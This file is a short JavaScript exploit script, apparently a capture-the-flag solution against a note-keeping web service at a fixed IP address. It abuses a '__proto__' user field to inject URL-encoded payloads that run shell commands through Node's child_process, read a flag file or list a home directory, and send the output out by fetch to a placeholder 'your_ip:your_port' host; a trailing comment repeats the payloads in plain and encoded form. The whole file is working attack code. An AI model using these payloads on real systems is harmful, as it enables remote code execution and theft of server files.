const payload = `
node%20%2De%20%22const%20%7B%20exec%20%7D%20%3D%20require%28%27child%5Fprocess%27%29%3B%20exec%28%27cat%20%2Fhome%2Fnotekeeper%2Fflag%2Etxt%27%2C%20%28err%2C%20stdout%2C%20stderr%29%20%3D%3E%20%7B%20if%20%28err%29%20%7B%20console%2Eerror%28err%29%3B%20return%3B%20%7D%20fetch%28%27http%3A%2F%2Fyour%5Fip%3Ayour%5Fport%2F%3Foutput%3D%27%20%2B%20encodeURIComponent%28stdout%29%29%2Ecatch%28console%2Eerror%29%3B%20%7D%29%3B%22%20%23%20`

fetch(`http://34.107.71.117:31412/add?user=__proto__&password=uploader&entry=${payload}`)
    .then(response => response.text())
    .then(data => {
        fetch('http://34.107.71.117:31412/dev')
            .then(response => response.text())
            .then(data => {
                console.log(data);
            })
            .catch(error => {
                console.error(error);
            });
    })
    .catch(error => {
        console.error(error);
    });
/*
node -e "const { exec } = require('child_process'); exec('ls /home/notekeeper', (err, stdout, stderr) => { if (err) { console.error(err); return; } fetch('http://your_ip:your_port/?output=' + encodeURIComponent(stdout)).catch(console.error); });" #

node%20%2De%20%22const%20%7B%20exec%20%7D%20%3D%20require%28%27child%5Fprocess%27%29%3B%20exec%28%27ls%20%2Fhome%2Fnotekeeper%27%2C%20%28err%2C%20stdout%2C%20stderr%29%20%3D%3E%20%7B%20if%20%28err%29%20%7B%20console%2Eerror%28err%29%3B%20return%3B%20%7D%20fetch%28%27http%3A%2F%2Fyour%5Fip%3Ayour%5Fport%2F%3Foutput%3D%27%20%2B%20encodeURIComponent%28stdout%29%29%2Ecatch%28console%2Eerror%29%3B%20%7D%29%3B%22%20%23%20


node -e "const { exec } = require('child_process'); exec('cat /home/notekeeper/flag.txt', (err, stdout, stderr) => { if (err) { console.error(err); return; } fetch('http://your_ip:your_port/?output=' + encodeURIComponent(stdout)).catch(console.error); });" #

node%20%2De%20%22const%20%7B%20exec%20%7D%20%3D%20require%28%27child%5Fprocess%27%29%3B%20exec%28%27cat%20%2Fhome%2Fnotekeeper%2Fflag%2Etxt%27%2C%20%28err%2C%20stdout%2C%20stderr%29%20%3D%3E%20%7B%20if%20%28err%29%20%7B%20console%2Eerror%28err%29%3B%20return%3B%20%7D%20fetch%28%27http%3A%2F%2Fyour%5Fip%3Ayour%5Fport%2F%3Foutput%3D%27%20%2B%20encodeURIComponent%28stdout%29%29%2Ecatch%28console%2Eerror%29%3B%20%7D%29%3B%22%20%23%20
*/